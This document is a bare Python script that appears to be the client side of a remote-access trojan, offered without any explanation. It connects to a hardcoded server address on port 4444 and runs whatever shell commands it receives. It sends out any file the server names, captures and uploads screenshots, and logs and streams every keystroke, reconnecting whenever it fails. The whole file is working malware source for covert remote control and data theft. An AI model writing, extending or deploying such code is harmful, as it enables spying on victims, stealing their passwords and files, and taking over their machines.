import socket
import subprocess
import pyautogui
import keyboard
import random

SERVER = "xxx xxx xxx xxx"
PORT = 4444


def send_keystrokes(s, on):
    def on_key_event(event):
        key = event.name
        s.sendall(key.encode())

    if on:
        keyboard.on_press(on_key_event)
    else:
        keyboard.unhook_all()


def main():
    s = socket.socket()
    s.connect((SERVER, PORT))
    msg = s.recv(1024).decode()
    on = False

    while True:
        cmd = s.recv(1024).decode()

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        if cmd.lower() == 'getdir':
            directory = s.recv(1024).decode()
            try:
                with open(directory, 'rb') as f:
                    s.sendall(f.read())
            except Exception as e:
                s.send(str(e).encode())
            continue

        if cmd.lower() == 'scrs':
            screenshot = pyautogui.screenshot()
            screenshot_file = f"client_screenshot_{random.randint(1, 10000000)}.png"
            screenshot.save(screenshot_file)
            with open(screenshot_file, "rb") as scr_f:
                while True:
                    chunk = scr_f.read(1024)
                    if not chunk:
                        break
                    s.sendall(chunk)
            print(f'[+] Screenshot taken and sent to server: {screenshot_file}')
            continue

        if cmd.lower() == 'keylogger':
            on = True
            send_keystrokes(s, on)
            while on:
                if s.recv(1024).decode() == 'stop':
                    on = False
                    send_keystrokes(s, on)
                    break
            continue

        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        except Exception as e:
            result = str(e).encode()

        if len(result) == 0:
            result = '[+] Executed'.encode()

        s.send(result)

    s.close()


while True:
    try:
        main()
    except Exception:
        main()
